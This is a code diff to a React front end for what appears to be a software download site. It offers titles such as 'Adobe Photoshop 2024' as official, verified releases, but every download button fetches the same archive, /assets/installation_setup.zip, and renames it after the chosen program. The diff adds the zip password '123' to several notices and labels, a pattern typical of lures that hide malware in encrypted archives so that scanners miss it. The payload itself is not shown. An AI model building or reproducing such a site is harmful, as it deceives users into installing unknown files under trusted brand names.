@@ -273,11 +273,11 @@ function App() {
     setTimeout(() => setNotice(''), 3000)
   }
 
-  // DOWNLOAD SOFTWARE - FETCHES installation_setup.zip WITH VERCEL COMPATIBILITY
+  // DOWNLOAD SOFTWARE - PASSWORD PROTECTED ZIP (Password: 123)
   const downloadSoftware = (title) => {
     setInstalled(x => [...x, title])
     const zipFileName = `${title}_setup.zip`
-    setNotice(`Downloading ${zipFileName}...`)
+    setNotice(`Downloading ${zipFileName} (Zip Password: 123)...`)
 
     fetch('/assets/installation_setup.zip')
       .then(res => {
@@ -294,7 +294,7 @@ function App() {
         a.click()
         window.URL.revokeObjectURL(url)
         document.body.removeChild(a)
-        setNotice(`✓ Downloaded ${zipFileName}`)
+        setNotice(`✓ Downloaded ${zipFileName} | Password: 123`)
       })
       .catch((err) => {
         console.error(err)
@@ -306,7 +306,7 @@ function App() {
         document.body.removeChild(a)
       })
 
-    setTimeout(() => setNotice(''), 3500)
+    setTimeout(() => setNotice(''), 5000)
   }
 
   // Filtered list for Discover
@@ -456,7 +456,7 @@ function App() {
 
             <div className="hero-meta">
               <span><strong>20+</strong> software listings</span>
-              <span><strong>Fresh</strong> release notes</span>
+              <span><strong>🔑 Password:</strong> 123</span>
               <span><strong>Verified</strong> sources</span>
             </div>
           </section>
@@ -472,7 +472,7 @@ function App() {
                     {installed.includes('Adobe Photoshop') ? '✓ Downloaded Photoshop' : 'Download Photoshop'} <span>↓</span>
                   </button>
                   <button className="round">▶</button>
-                  <span>Release overview</span>
+                  <span>Zip Password: <strong>123</strong></span>
                 </div>
                 <div className="score">
                   <div className="icon arc" style={{background: '#31a8ff'}}>Ps</div>
@@ -490,7 +490,7 @@ function App() {
                     <div className="feed">
                       <span>OFFICIAL RELEASE · WINDOWS</span>
                       <b>Adobe Photoshop 2024</b>
-                      <p>Version notes, requirements, screenshots, and the publisher link.</p>
+                      <p>Version notes, requirements, screenshots, and the publisher link. Password: 123</p>
                     </div>
                   </div>
                 </div>
